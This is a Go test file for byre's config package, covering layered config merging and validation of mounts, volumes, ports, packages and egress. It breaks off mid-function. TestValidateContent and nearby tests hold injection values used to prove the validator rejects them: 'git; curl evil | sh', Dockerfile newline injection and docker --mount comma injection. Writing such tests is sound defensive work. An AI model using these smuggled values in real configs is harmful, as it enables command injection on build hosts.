package config

import (
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"github.com/pjlsergeant/byre/internal/project"
)

func TestMergeScalarOverride(t *testing.T) {
	got := Merge(Config{Engine: "docker", Base: "debian"}, Config{Engine: "podman"})
	if got.Engine != "podman" {
		t.Errorf("engine override: got %q", got.Engine)
	}
	if got.Base != "debian" {
		t.Errorf("base should persist when over is empty: got %q", got.Base)
	}
}

func TestMergeStringUnionDedup(t *testing.T) {
	got := Merge(Config{Skills: []string{"a", "b"}}, Config{Skills: []string{"b", "c"}}).Skills
	if want := []string{"a", "b", "c"}; !reflect.DeepEqual(got, want) {
		t.Errorf("union: got %v want %v", got, want)
	}
}

func TestMergeStringRemoval(t *testing.T) {
	got := Merge(Config{Skills: []string{"a", "b"}}, Config{Skills: []string{"!a", "c"}}).Skills
	if want := []string{"b", "c"}; !reflect.DeepEqual(got, want) {
		t.Errorf("removal: got %v want %v", got, want)
	}
}

func TestMergeMap(t *testing.T) {
	got := Merge(
		Config{Env: map[string]string{"X": "1", "Y": "2"}},
		Config{Env: map[string]string{"Y": "3", "Z": "4"}},
	).Env
	want := map[string]string{"X": "1", "Y": "3", "Z": "4"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("map merge: got %v want %v", got, want)
	}
}

func TestMergeVolumesOverrideAndRemove(t *testing.T) {
	base := Config{Volumes: []Volume{
		{Name: "cache", Role: "cache", Target: "/c"},
		{Name: "creds", Role: "state", Target: "/s"},
	}}
	over := Config{Volumes: []Volume{
		{Name: "cache", Role: "cache", Target: "/c2"}, // override target
		{Name: "!creds"}, // remove
	}}
	got := Merge(base, over).Volumes
	if len(got) != 1 || got[0].Name != "cache" || got[0].Target != "/c2" {
		t.Errorf("volume override/remove: got %+v", got)
	}
}

func TestMergeMountsByTarget(t *testing.T) {
	base := Config{Mounts: []Mount{{Host: "/h", Target: "/t", Mode: "ro"}}}
	over := Config{Mounts: []Mount{{Host: "/h2", Target: "/t", Mode: "rw"}}}
	got := Merge(base, over).Mounts
	if len(got) != 1 || got[0].Mode != "rw" || got[0].Host != "/h2" {
		t.Errorf("mount override by target: got %+v", got)
	}
}

func TestMergeMountsReenableByReplacing(t *testing.T) {
	// disabled is part of the whole-entry replace: a later layer restating the
	// target without it re-enables the mount (no per-field merge).
	base := Config{Mounts: []Mount{{Host: "/h", Target: "/t", Mode: "rw", Disabled: true}}}
	over := Config{Mounts: []Mount{{Host: "/h", Target: "/t", Mode: "rw"}}}
	got := Merge(base, over).Mounts
	if len(got) != 1 || got[0].Disabled {
		t.Errorf("later layer should re-enable by replacement: got %+v", got)
	}
}

func TestValidateDisabledMountStillChecked(t *testing.T) {
	// A disabled mount is still config: shape errors and target collisions
	// fail now, not on re-enable.
	if err := (Config{Mounts: []Mount{{Target: "/t", Disabled: true}}}).Validate(); err == nil {
		t.Error("disabled mount without host should still fail validation")
	}
	dup := Config{Mounts: []Mount{
		{Host: "/a", Target: "/t", Disabled: true}, {Host: "/b", Target: "/t"},
	}}
	if err := dup.Validate(); err == nil {
		t.Error("disabled mount should still collide on target")
	}
}

func TestRawBlocksAppendOnly(t *testing.T) {
	got := Merge(Config{DockerfilePre: []string{"RUN a"}}, Config{DockerfilePre: []string{"RUN a", "RUN b"}}).DockerfilePre
	if want := []string{"RUN a", "RUN a", "RUN b"}; !reflect.DeepEqual(got, want) {
		t.Errorf("raw append-only (no dedup/removal): got %v want %v", got, want)
	}
}

func TestAptHonorsRemoval(t *testing.T) {
	// Reversed by ADR 0018: apt takes `!name` like every other string list.
	// (Previously pinned as literal-only; packageRe never admitted a leading
	// '!', so no real package is shadowed by the marker.)
	got := Merge(Config{Apt: []string{"a"}}, Config{Apt: []string{"!a", "b"}}).Apt
	if want := []string{"b"}; !reflect.DeepEqual(got, want) {
		t.Errorf("apt should honor !removal: got %v want %v", got, want)
	}
}

func TestValidateMountHostRequired(t *testing.T) {
	if err := (Config{Mounts: []Mount{{Target: "/t"}}}).Validate(); err == nil {
		t.Fatal("expected error for mount without host")
	}
}

func TestValidateTargetCollisions(t *testing.T) {
	cases := map[string]Config{
		"dup mount target": {Mounts: []Mount{
			{Host: "/a", Target: "/t"}, {Host: "/b", Target: "/t"},
		}},
		"dup volume name": {Volumes: []Volume{
			{Name: "v", Role: "cache", Target: "/x"}, {Name: "v", Role: "cache", Target: "/y"},
		}},
		"dup volume target": {Volumes: []Volume{
			{Name: "v1", Role: "cache", Target: "/t"}, {Name: "v2", Role: "cache", Target: "/t"},
		}},
		"mount/volume target collision": {
			Mounts:  []Mount{{Host: "/a", Target: "/shared"}},
			Volumes: []Volume{{Name: "v", Role: "cache", Target: "/shared"}},
		},
	}
	for name, c := range cases {
		if err := c.Validate(); err == nil {
			t.Errorf("%s: expected collision error", name)
		}
	}
}

func TestLoadMissingTemplateErrors(t *testing.T) {
	home := t.TempDir()
	t.Setenv("BYRE_HOME", home)
	proj := t.TempDir()
	writeProjectCfg(t, proj, "template = \"nope\"\n")
	if _, err := Load(proj); err == nil {
		t.Fatal("expected error for missing explicitly-selected template")
	}
}

func TestDockerfileKeyRejectedLoudly(t *testing.T) {
	// The full-Dockerfile opt-out was removed (ADR 0014): a config still
	// carrying the key must fail as unknown, not be silently ignored.
	t.Setenv("BYRE_HOME", t.TempDir())
	proj := t.TempDir()
	writeProjectCfg(t, proj, "dockerfile = \"Dockerfile\"\n")
	if _, err := Load(proj); err == nil || !strings.Contains(err.Error(), "unknown key") {
		t.Fatalf("dockerfile key must fail loudly as unknown, got: %v", err)
	}
}

func TestValidateRejectsBadEngine(t *testing.T) {
	if err := (Config{Engine: "containerd"}).Validate(); err == nil {
		t.Fatal("expected invalid-engine rejection")
	}
}

func TestValidateWorktreeBase(t *testing.T) {
	for _, ok := range []string{"", "sibling", "~", "~/worktrees", "/abs/base"} {
		if err := (Config{WorktreeBase: ok}).Validate(); err != nil {
			t.Errorf("worktree_base %q should be valid: %v", ok, err)
		}
	}
	for _, bad := range []string{"relative-dir", "./x", "/has,comma"} {
		if err := (Config{WorktreeBase: bad}).Validate(); err == nil {
			t.Errorf("worktree_base %q should be rejected", bad)
		}
	}
}

func TestValidateVolumeRules(t *testing.T) {
	cases := map[string]Config{
		"bad role":      {Volumes: []Volume{{Name: "v", Role: "nope", Target: "/t"}}},
		"no target":     {Volumes: []Volume{{Name: "v", Role: "cache"}}},
		"seed on cache": {Volumes: []Volume{{Name: "v", Role: "cache", Target: "/t", Seed: &Seed{Host: "/h"}}}},
		"empty seed":    {Volumes: []Volume{{Name: "v", Role: "state", Target: "/t", Seed: &Seed{}}}},
		"two seed srcs": {Volumes: []Volume{{Name: "v", Role: "state", Target: "/t", Seed: &Seed{Host: "/h", Literal: "x"}}}},
		"no name":       {Volumes: []Volume{{Role: "cache", Target: "/t"}}},
	}
	for name, c := range cases {
		if err := c.Validate(); err == nil {
			t.Errorf("%s: expected validation error", name)
		}
	}
}

func TestValidateVolumeNameCharset(t *testing.T) {
	// Dotfile-style state volume names must be accepted (.claude etc).
	ok := Config{Volumes: []Volume{{Name: ".claude", Role: "state", Target: "/home/dev/.claude", Seed: &Seed{Host: "~/.claude"}}}}
	if err := ok.Validate(); err != nil {
		t.Errorf(".claude volume name rejected: %v", err)
	}
	bad := Config{Volumes: []Volume{{Name: "bad/name", Role: "cache", Target: "/t"}}}
	if err := bad.Validate(); err == nil {
		t.Error("expected rejection of volume name with '/'")
	}
}

func TestValidateVolumeScope(t *testing.T) {
	ok := Config{Volumes: []Volume{{Name: "claude-identity", Role: "state", Target: "/t", Scope: "machine"}}}
	if err := ok.Validate(); err != nil {
		t.Errorf("machine scope rejected: %v", err)
	}
	explicit := Config{Volumes: []Volume{{Name: "v", Role: "cache", Target: "/t", Scope: "project"}}}
	if err := explicit.Validate(); err != nil {
		t.Errorf("explicit project scope rejected: %v", err)
	}
	bad := Config{Volumes: []Volume{{Name: "v", Role: "cache", Target: "/t", Scope: "global"}}}
	if err := bad.Validate(); err == nil {
		t.Error("expected rejection of unknown scope")
	}
	// seed + machine scope don't compose: the seed pipeline names its target
	// volume project-scoped, and identity volumes are box-born (ADR 0017).
	seeded := Config{Volumes: []Volume{{Name: "v", Role: "state", Target: "/t", Scope: "machine", Seed: &Seed{Host: "~/x"}}}}
	if err := seeded.Validate(); err == nil {
		t.Error("expected rejection of seed on a machine-scoped volume")
	}
}

func TestValidateLiteralSeed(t *testing.T) {
	ok := Config{Volumes: []Volume{{Name: "c", Role: "state", Target: "/t", Seed: &Seed{Literal: "x", Path: "a/b.conf"}}}}
	if err := ok.Validate(); err != nil {
		t.Errorf("valid literal seed rejected: %v", err)
	}
	bad := map[string]Config{
		"literal without path": {Volumes: []Volume{{Name: "c", Role: "state", Target: "/t", Seed: &Seed{Literal: "x"}}}},
		"literal abs path":     {Volumes: []Volume{{Name: "c", Role: "state", Target: "/t", Seed: &Seed{Literal: "x", Path: "/etc/x"}}}},
		"literal escape path":  {Volumes: []Volume{{Name: "c", Role: "state", Target: "/t", Seed: &Seed{Literal: "x", Path: "../x"}}}},
		"path on host seed":    {Volumes: []Volume{{Name: "c", Role: "state", Target: "/t", Seed: &Seed{Host: "~/x", Path: "a"}}}},
	}
	for name, c := range bad {
		if err := c.Validate(); err == nil {
			t.Errorf("%s: expected validation error", name)
		}
	}
}

func TestValidateAcceptsGoodConfig(t *testing.T) {
	c := Config{
		Engine:  "auto",
		Volumes: []Volume{{Name: "creds", Role: "state", Target: "/home/dev/.claude", Seed: &Seed{Host: "~/.claude"}}},
		Mounts:  []Mount{{Host: "/data", Target: "/data", Mode: "ro"}},
	}
	if err := c.Validate(); err != nil {
		t.Fatalf("good config rejected: %v", err)
	}
}

func TestLoadCascade(t *testing.T) {
	home := t.TempDir()
	t.Setenv("BYRE_HOME", home)
	proj := t.TempDir()

	writeFile(t, filepath.Join(home, "default.config"),
		"engine = \"docker\"\nbase = \"debian:bookworm\"\nskills = [\"base\"]\n")
	tmplDir := filepath.Join(home, "templates", "node")
	if err := os.MkdirAll(tmplDir, 0o755); err != nil {
		t.Fatal(err)
	}
	writeFile(t, filepath.Join(tmplDir, "template.config"),
		"base = \"node:22\"\napt = [\"build-essential\"]\nskills = [\"node-tools\"]\n")
	writeProjectCfg(t, proj,
		"template = \"node\"\nagent = \"claude\"\nskills = [\"proj\"]\n")

	cfg, err := Load(proj)
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Base != "node:22" {
		t.Errorf("base: template should override default: got %q", cfg.Base)
	}
	if cfg.Engine != "docker" {
		t.Errorf("engine: should come from default: got %q", cfg.Engine)
	}
	if cfg.Agent != "claude" {
		t.Errorf("agent: got %q", cfg.Agent)
	}
	if want := []string{"base", "node-tools", "proj"}; !reflect.DeepEqual(cfg.Skills, want) {
		t.Errorf("skills cascade: got %v want %v", cfg.Skills, want)
	}
	if want := []string{"build-essential"}; !reflect.DeepEqual(cfg.Apt, want) {
		t.Errorf("apt from template: got %v want %v", cfg.Apt, want)
	}
}

func TestLoadIgnoresDefaultTemplateAndAgent(t *testing.T) {
	home := t.TempDir()
	t.Setenv("BYRE_HOME", home)
	proj := t.TempDir() // no byre.config

	// default.config sets template/agent (picker pre-selections) and
	// shared_auth_declined (vestigial v0.1.7 picker state, ADR 0025 — must
	// still parse and still never cascade) plus base/apt.
	writeFile(t, filepath.Join(home, "default.config"),
		"agent = \"claude\"\ntemplate = \"node\"\nshared_auth_declined = [\"claude\"]\nbase = \"debian:bookworm\"\napt = [\"git\"]\n")

	cfg, err := Load(proj)
	if err != nil {
		t.Fatal(err)
	}
	// template/agent must NOT cascade from default.config...
	if cfg.Agent != "" {
		t.Errorf("default agent must not cascade, got %q", cfg.Agent)
	}
	// ...nor the picker-owned decline record...
	if len(cfg.SharedAuthDeclined) != 0 {
		t.Errorf("shared_auth_declined must not cascade, got %v", cfg.SharedAuthDeclined)
	}
	if cfg.Base != "debian:bookworm" {
		t.Errorf("default template must not apply (base should stay debian), got %q", cfg.Base)
	}
	// ...but base/apt still do.
	if len(cfg.Apt) != 1 || cfg.Apt[0] != "git" {
		t.Errorf("default base/apt should still cascade, got %v", cfg.Apt)
	}
}

func TestLoadMalformedTOML(t *testing.T) {
	home := t.TempDir()
	t.Setenv("BYRE_HOME", home)
	proj := t.TempDir()
	writeProjectCfg(t, proj, "this is = not = valid toml\n")
	if _, err := Load(proj); err == nil {
		t.Fatal("expected malformed-TOML error")
	}
}

func writeFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

// writeProjectCfg writes a project's byre.config to the host-side store
// (~/.byre/projects/<id>/byre.config), where Load now reads it.
func writeProjectCfg(t *testing.T, projectDir, content string) {
	t.Helper()
	p, err := project.Resolve(projectDir)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(p.Dir, 0o755); err != nil {
		t.Fatal(err)
	}
	writeFile(t, filepath.Join(p.Dir, ProjectConfigName), content)
}

func TestValidateRejectsNonAbsoluteVolumeTarget(t *testing.T) {
	c := Config{Volumes: []Volume{{Name: "v", Role: "cache", Target: "rel/path"}}}
	if err := c.Validate(); err == nil {
		t.Fatal("expected rejection of non-absolute volume target")
	}
}

func TestValidateRejectsControlCharInTarget(t *testing.T) {
	c := Config{Volumes: []Volume{{Name: "v", Role: "cache", Target: "/x\nRUN evil"}}}
	if err := c.Validate(); err == nil {
		t.Fatal("expected rejection of newline in volume target (Dockerfile injection)")
	}
	m := Config{Mounts: []Mount{{Host: "/h", Target: "/x\ny"}}}
	if err := m.Validate(); err == nil {
		t.Fatal("expected rejection of newline in mount target")
	}
}

func TestValidateRejectsCommaInTarget(t *testing.T) {
	// A comma injects extra fields into docker's comma-delimited --mount value.
	m := Config{Mounts: []Mount{{Host: "/h", Target: "/x,readonly"}}}
	if err := m.Validate(); err == nil {
		t.Fatal("expected rejection of comma in mount target (--mount option injection)")
	}
	v := Config{Volumes: []Volume{{Name: "v", Role: "cache", Target: "/x,volume-opt=device=/"}}}
	if err := v.Validate(); err == nil {
		t.Fatal("expected rejection of comma in volume target")
	}
}

func TestValidateContent(t *testing.T) {
	bad := map[string]Config{
		"base newline":     {Base: "debian\nRUN evil"},
		"base space":       {Base: "debian AS x"},
		"apt shell":        {Apt: []string{"git; curl evil | sh"}},
		"apt space":        {Apt: []string{"git curl"}},
		"npm shell":        {NpmGlobal: []string{"pkg && evil"}},
		"npm redirect":     {NpmGlobal: []string{"pkg@>1 x"}},
		"env key space":    {Env: map[string]string{"A B": "v"}},
		"env key newline":  {Env: map[string]string{"A\nENV X": "v"}},
		"env key leading$": {Env: map[string]string{"1A": "v"}},
	}
	for name, c := range bad {
		if err := c.Validate(); err == nil {
			t.Errorf("%s: expected rejection, got nil", name)
		}
	}
	// Legitimate specs must still pass.
	ok := Config{
		Base:      "registry.example.com:5000/org/img@sha256:abc",
		Apt:       []string{"git", "build-essential", "libssl-dev", "python3=3.11.2"},
		NpmGlobal: []string{"@anthropic-ai/claude-code", "typescript", "pnpm@8.15.0"},
		Env:       map[string]string{"NODE_ENV": "production", "_FOO": "1"},
	}
	if err := ok.Validate(); err != nil {
		t.Fatalf("valid content rejected: %v", err)
	}
}

func TestValidateLayerAllowsRemovals(t *testing.T) {
	// A `!name` removal marker is legal in an unmerged layer but is a malformed
	// entry in a resolved config. ValidateLayer accepts it; Validate rejects it.
	layer := Config{
		Skills:  []string{"!devloop"},
		Volumes: []Volume{{Name: "!creds"}},
		Mounts:  []Mount{{Target: "!/x"}},
	}
	if err := layer.ValidateLayer(); err != nil {
		t.Fatalf("ValidateLayer rejected removal markers: %v", err)
	}
	if err := layer.Validate(); err == nil {
		t.Fatal("Validate should reject removal markers in a resolved config")
	}
	// ValidateLayer still catches a genuinely malformed real entry.
	bad := Config{Volumes: []Volume{{Name: "creds", Role: "bogus", Target: "/c"}}}
	if err := bad.ValidateLayer(); err == nil {
		t.Fatal("ValidateLayer should still reject a bad role on a real entry")
	}
}

func TestValidateLayerMarkersAreBare(t *testing.T) {
	// A removal marker takes only its identity field — same stance as port
	// remove entries. Anything more means the author probably intended a real
	// entry with a mistyped `!` (the editor's add path always sets host+mode,
	// and merge would silently turn it into a removal).
	cases := []Config{
		{Mounts: []Mount{{Target: "!/x", Host: "/host"}}},
		{Mounts: []Mount{{Target: "!/x", Mode: "ro"}}},
		{Mounts: []Mount{{Target: "!/x", Disabled: true}}},
		{Volumes: []Volume{{Name: "!creds", Target: "/c"}}},
		{Volumes: []Volume{{Name: "!creds", Role: "state"}}},
		{Volumes: []Volume{{Name: "!creds", Scope: "machine"}}},
		{Volumes: []Volume{{Name: "!creds", Seed: &Seed{Host: "~/x"}}}},
	}
	for i, c := range cases {
		if err := c.ValidateLayer(); err == nil {
			t.Errorf("case %d: marker with extra fields should be rejected: %+v", i, c)
		}
	}
}

func TestValidateLayerRejectsEmptyMarkers(t *testing.T) {
	// A bare "!" is a removal marker of nothing — it would merge as a silent
	// no-op (remove the entry named ""). isRemoval requires an identity, so a
	// bare "!" falls through to the real-entry shape checks (packageRe,
	// ParseEgress, validContainerTarget, volumeNameRe), which are all loud;
	// the skills list has no shape grammar, so it gets an explicit guard that
	// also covers an empty-string entry.
	cases := []Config{
		{Apt: []string{"!"}},
		{NpmGlobal: []string{"!"}},
		{Egress: []string{"!"}},
		{EgressOffered: []string{"!"}},
		{Mounts: []Mount{{Target: "!"}}},
		{Volumes: []Volume{{Name: "!"}}},
		{Skills: []string{"!"}},
		{Skills: []string{""}},
	}
	for i, c := range cases {
		if err := c.ValidateLayer(); err == nil {
			t.Errorf("case %d: bare/empty marker should be rejected: %+v", i, c)
		}
	}
}

func TestValidatePorts(t *testing.T) {
	ok := Config{Ports: []Port{{Container: 8080, Host: 8080, Interface: "127.0.0.1"}, {Container: 3000}}}
	if err := ok.Validate(); err != nil {
		t.Fatalf("valid ports rejected: %v", err)
	}
	bad := map[string]Config{
		"container out of range": {Ports: []Port{{Container: 0}}},
		"host out of range":      {Ports: []Port{{Container: 80, Host: 99999}}},
		"dup host binding":       {Ports: []Port{{Container: 80, Host: 8080}, {Container: 81, Host: 8080}}},
		// The interface lands in docker's colon-delimited -p grammar: only a
		// canonical IPv4 literal may pass, or the value fails (or changes
		// meaning) at engine invocation instead of at validation.
		"hostname interface":      {Ports: []Port{{Container: 80, Interface: "localhost"}}},
		"ipv6 interface":          {Ports: []Port{{Container: 80, Interface: "::1"}}},
		"mapped-ipv4 spelling":    {Ports: []Port{{Container: 80, Interface: "::ffff:127.0.0.1"}}},
		"whitespace interface":    {Ports: []Port{{Container: 80, Interface: " 127.0.0.1"}}},
		"colon-bearing interface": {Ports: []Port{{Container: 80, Interface: "127.0.0.1:80"}}},
	}
	for name, c := range bad {
		if err := c.Validate(); err == nil {
			t.Errorf("%s: expected a validation error", name)
		}
	}
	// Two blank-host ports (mirror distinct container ports) don't collide.
	if err := (Config{Ports: []Port{{Container: 80}, {Container: 81}}}).Validate(); err != nil {
		t.Errorf("ephemeral ports should not collide: %v", err)
	}
}

func TestMergePortsDedup(t *testing.T) {
	base := Config{Ports: []Port{{Container: 8080, Host: 8080}}}
	over := Config{Ports: []Port{{Container: 8080, Host: 8080}, {Container: 3000}}}
	got := Merge(base, over).Ports
	if len(got) != 2 {
		t.Fatalf("expected dedup to 2 ports, got %v", got)
	}
}

func TestListTemplates(t *testing.T) {
	dir := t.TempDir()
	for _, n := range []string{"go", "python"} {
		td := filepath.Join(dir, n)
		os.MkdirAll(td, 0o755)
		os.WriteFile(filepath.Join(td, "template.config"), []byte("base = \"x\"\n"), 0o644)
	}
	os.MkdirAll(filepath.Join(dir, "empty"), 0o755) // no template.config -> excluded
	got := ListTemplates(dir)
	if len(got) != 2 || got[0] != "go" || got[1] != "python" {
		t.Fatalf("ListTemplates = %v", got)
	}
}

// sampleConfig sets EVERY Config field to a non-zero sample. The merge growth
// guard reflects over Config and fails if a field is left zero here, so adding
// a field to Config forces adding it both here and to Merge.
func sampleConfig() Config {
	return Config{
		Engine:             "podman",
		Template:           "go",
		Agent:              "claude",
		Base:               "debian:bookworm",
		SeedPrefs:          true,
		WorktreeBase:       "sibling",
		Apt:                []string{"jq"},
		NpmGlobal:          []string{"typescript"},
		Env:                map[string]string{"K": "v"},
		Files:              map[string]string{"a.txt": "/opt/a.txt"},
		Skills:             []string{"devloop"},
		SharedAuthDeclined: []string{"claude"},
		Egress:             []string{"grafana.com"},
		EgressOffered:      []string{"registry.npmjs.org"},
		Mounts:             []Mount{{Host: "/h", Target: "/t", Mode: "ro"}},
		Volumes:            []Volume{{Name: "v", Role: "cache", Target: "/c"}},
		Ports:              []Port{{Container: 8080}},
		DockerfilePre:      []string{"RUN true"},
		DockerfilePost:     []string{"RUN false"},
		RunArgs:            []string{"--cap-add=X"},
	}
}

// TestMergeCoversEveryField is the growth guard for Merge's hand enumeration:
// a new Config field Merge doesn't handle would silently VANISH when set in an
// override layer (out starts as base, so only the base->out direction survives
// by default). Merging a fully-populated sample over an empty base — and vice
// versa — must reproduce it exactly, and reflection forces the sample to keep
// covering every field.
func TestMergeCoversEveryField(t *testing.T) {
	sample := sampleConfig()
	v := reflect.ValueOf(sample)
	for i := 0; i < v.NumField(); i++ {
		if v.Field(i).IsZero() {
			t.Fatalf("sampleConfig leaves Config.%s zero — give it a sample value so the merge guard covers it (and handle it in Merge)", v.Type().Field(i).Name)
		}
	}
	if got := Merge(Config{}, sample); !reflect.DeepEqual(got, sample) {
		t.Errorf("Merge(empty, sample) must reproduce the sample — a field Merge doesn't propagate vanishes from override layers:\ngot  %+v\nwant %+v", got, sample)
	}
	if got := Merge(sample, Config{}); !reflect.DeepEqual(got, sample) {
		t.Errorf("Merge(sample, empty) must reproduce the sample:\ngot  %+v\nwant %+v", got, sample)
	}
}

// Within-layer duplicates are silent last-wins at merge — the losing entry
// vanishes before the resolved Validate can see it — so ValidateLayer must
// reject them. Cross-layer overrides stay legal (not this check's concern).
func TestValidateLayerRejectsWithinLayerDuplicates(t *testing.T) {
	dupMount := Config{Mounts: []Mount{
		{Host: "/a", Target: "/x", Mode: "ro"},
		{Host: "/b", Target: "/x", Mode: "ro"},
	}}
	if err := dupMount.ValidateLayer(); err == nil {
		t.Error("duplicate mount target within one layer must be rejected")
	}
	dupVol := Config{Volumes: []Volume{
		{Name: "v", Role: "cache", Target: "/c1"},
		{Name: "v", Role: "cache", Target: "/c2"},
	}}
	if err := dupVol.ValidateLayer(); err == nil {
		t.Error("duplicate volume name within one layer must be rejected")
	}
	// Cross-kind: a volume claiming a mount's target (or another volume's)
	// fails the resolved Validate at develop time — refuse at save instead.
	mixed := Config{
		Mounts:  []Mount{{Host: "/a", Target: "/x", Mode: "ro"}},
		Volumes: []Volume{{Name: "v", Role: "cache", Target: "/x"}},
	}
	if err := mixed.ValidateLayer(); err == nil {
		t.Error("mount + volume on one target within a layer must be rejected")
	}
	twoVols := Config{Volumes: []Volume{
		{Name: "a", Role: "cache", Target: "/x"},
		{Name: "b", Role: "cache", Target: "/x"},
	}}
	if err := twoVols.ValidateLayer(); err == nil {
		t.Error("two volumes on one target within a layer must be rejected")
	}

	// A removal marker plus the real entry it removes elsewhere is fine.
	withRemoval := Config{Mounts: []Mount{
		{Target: "!/x"},
		{Host: "/a", Target: "/x", Mode: "ro"},
	}}
	if err := withRemoval.ValidateLayer(); err != nil {
		t.Errorf("removal marker + real entry must stay saveable: %v", err)
	}
}

// TestLoadRejectsWithinLayerCollisionInAnyLayer pins that the per-layer rules
// hold for HAND-EDITED files too, not just editor saves — a duplicate in any
// cascade layer errors at load, naming the file, instead of silently merging
// last-wins. ParseFile stays lenient so the editor can open a broken file.
func TestLoadRejectsWithinLayerCollisionInAnyLayer(t *testing.T) {
	home := t.TempDir()
	t.Setenv("BYRE_HOME", home)
	proj := t.TempDir()
	dup := "[[mounts]]\nhost = \"/a\"\ntarget = \"/x\"\n[[mounts]]\nhost = \"/b\"\ntarget = \"/x\"\n"

	// Project layer (the host-side store copy).
	p, err := project.Resolve(proj)
	if err != nil {
		t.Fatal(err)
	}
	os.MkdirAll(p.Dir, 0o755)
	storeCfg := filepath.Join(p.Dir, ProjectConfigName)
	os.WriteFile(storeCfg, []byte(dup), 0o644)
	if _, err := Load(proj); err == nil || !strings.Contains(err.Error(), storeCfg) {
		t.Errorf("duplicate in the project layer should fail load naming the file, got %v", err)
	}
	os.Remove(storeCfg)

	// Default layer.
	defCfg := filepath.Join(home, "default.config")
	os.WriteFile(defCfg, []byte(dup), 0o644)
	if _, err := Load(proj); err == nil || !strings.Contains(err.Error(), defCfg) {
		t.Errorf("duplicate in default.config should fail load naming the file, got %v", err)
	}
	os.Remove(defCfg)

	// ParseFile (the editor's open path) must still tolerate it.
	os.WriteFile(storeCfg, []byte(dup), 0o644)
	if _, err := ParseFile(storeCfg); err != nil {
		t.Errorf("ParseFile must stay lenient so the editor can open a broken file: %v", err)
	}
}

func TestMergeAptNpmRemoval(t *testing.T) {
	// ADR 0018: package lists take the same `!name` off-switch as skills.
	got := Merge(Config{Apt: []string{"ripgrep", "htop"}}, Config{Apt: []string{"!htop", "jq"}}).Apt
	if want := []string{"ripgrep", "jq"}; !reflect.DeepEqual(got, want) {
		t.Errorf("apt removal: got %v want %v", got, want)
	}
	got = Merge(Config{NpmGlobal: []string{"prettier"}}, Config{NpmGlobal: []string{"!prettier"}}).NpmGlobal
	if len(got) != 0 {
		t.Errorf("npm_global removal: got %v want empty", got)
	}
}

func TestMergePortsRemove(t *testing.T) {
	// remove=true keys on container port ALONE: every inherited binding of that
	// container port dies, whatever its interface/host (ADR 0018).
	base := Config{Ports: []Port{
		{Container: 5432},
		{Container: 5432, Interface: "0.0.0.0", Host: 15432},
		{Container: 3000},
	}}
	over := Config{Ports: []Port{{Container: 5432, Remove: true}}}
	got := Merge(base, over).Ports
	if len(got) != 1 || got[0].Container != 3000 {
		t.Errorf("port remove: got %+v", got)
	}
	for _, p := range got {
		if p.Remove {
			t.Errorf("merge must consume remove markers, got %+v", p)
		}
	}
}

func TestMergePortsRemoveAfterAdditions(t *testing.T) {
	// Removals apply after the same layer's additions, matching the `!name`
	// lists: an add+remove of the same container port in one layer resolves off.
	base := Config{Ports: []Port{{Container: 8080}}}
	over := Config{Ports: []Port{
		{Container: 8080, Host: 18080},
		{Container: 8080, Remove: true},
	}}
	if got := Merge(base, over).Ports; len(got) != 0 {
		t.Errorf("add+remove same layer should resolve off: got %+v", got)
	}
}

func TestValidateLayerAcceptsPackageMarkers(t *testing.T) {
	c := Config{Apt: []string{"!htop"}, NpmGlobal: []string{"!prettier"}}
	if err := c.ValidateLayer(); err != nil {
		t.Errorf("layer with package removal markers should validate: %v", err)
	}
	// A marker surviving to a RESOLVED config is a bug and must be rejected.
	if err := c.Validate(); err == nil {
		t.Error("resolved config with a `!name` package should fail validation")
	}
}

func TestValidateLayerPortRemoveEntries(t *testing.T) {
	ok := Config{Ports: []Port{{Container: 5432, Remove: true}}}
	if err := ok.ValidateLayer(); err != nil {
		t.Errorf("layer with a port remove marker should validate: %v", err)
	}
	// Removal ignores host/interface; an entry setting them implies a narrower
	// removal than will happen — refused at save.
	narrow := Config{Ports: []Port{{Container: 5432, Host: 15432, Remove: true}}}
	if err := narrow.ValidateLayer(); err == nil {
		t.Error("port remove with host set should fail layer validation")
	}
	if err := ok.Validate(); err == nil {
		t.Error("resolved config with a port remove marker should fail validation")
	}
}

func TestValidateLayerPortRemoveNoCollision(t *testing.T) {
	// A remove marker binds nothing: it must not count toward host-port
	// collision accounting in its own layer.
	c := Config{Ports: []Port{
		{Container: 5432, Remove: true},
		{Container: 5432},
	}}
	if err := c.ValidateLayer(); err != nil {
		t.Errorf("remove marker + real binding of same port should validate: %v", err)
	}
}

func TestMergeEgressUnionAndRemoval(t *testing.T) {
	got := Merge(Config{Egress: []string{"grafana.com", "internal:8443"}},
		Config{Egress: []string{"!internal:8443", "api.stripe.com"}}).Egress
	if want := []string{"grafana.com", "api.stripe.com"}; !reflect.DeepEqual(got, want) {
		t.Errorf("egress merge: got %v want %v", got, want)
	}
}

func TestValidateEgressEntries(t *testing.T) {
	if err := (Config{Egress: []string{"grafana.com", "internal:8443"}}).ValidateLayer(); err != nil {
		t.Errorf("valid egress should pass: %v", err)
	}
	if err := (Config{Egress: []string{"internal:99999"}}).ValidateLayer(); err == nil {
		t.Error("out-of-range egress port should fail")
	}
	if err := (Config{Egress: []string{"bad host"}}).ValidateLayer(); err == nil {
		t.Error("egress host with a space should fail")
	}
	// Markers: legal in a layer, a bug in a resolved config.
	marker := Config{Egress: []string{"!grafana.com"}}
	if err := marker.ValidateLayer(); err != nil {
		t.Errorf("egress removal marker should pass layer validation: %v", err)
	}
	if err := marker.Validate(); err == nil {
		t.Error("egress marker surviving to a resolved config should fail")
	}
}

func TestParseEgress(t *testing.T) {
	if h, p, err := ParseEgress("deb.debian.org:80"); err != nil || h != "deb.debian.org" || p != 80 {
		t.Fatalf("ParseEgress explicit = (%q,%d,%v)", h, p, err)
	}
	if h, p, err := ParseEgress("grafana.com"); err != nil || h != "grafana.com" || p != 443 {
		t.Fatalf("ParseEgress default = (%q,%d,%v)", h, p, err)
	}
	for _, bad := range []string{"", "host:0", "host:99999", "::1", "a b"} {
		if _, _, err := ParseEgress(bad); err == nil {
			t.Errorf("ParseEgress(%q) should fail", bad)
		}
	}
}

// shared_auth_declined is stripped from EVERY resolved config, whatever layer
// carried it — the key is vestigial (ADR 0025), tolerated only so v0.1.7-
// written configs still parse, and must never ride the cascade.
func TestSharedAuthDeclinedNeverResolves(t *testing.T) {
	home := t.TempDir()
	t.Setenv("BYRE_HOME", home)
	proj := t.TempDir()
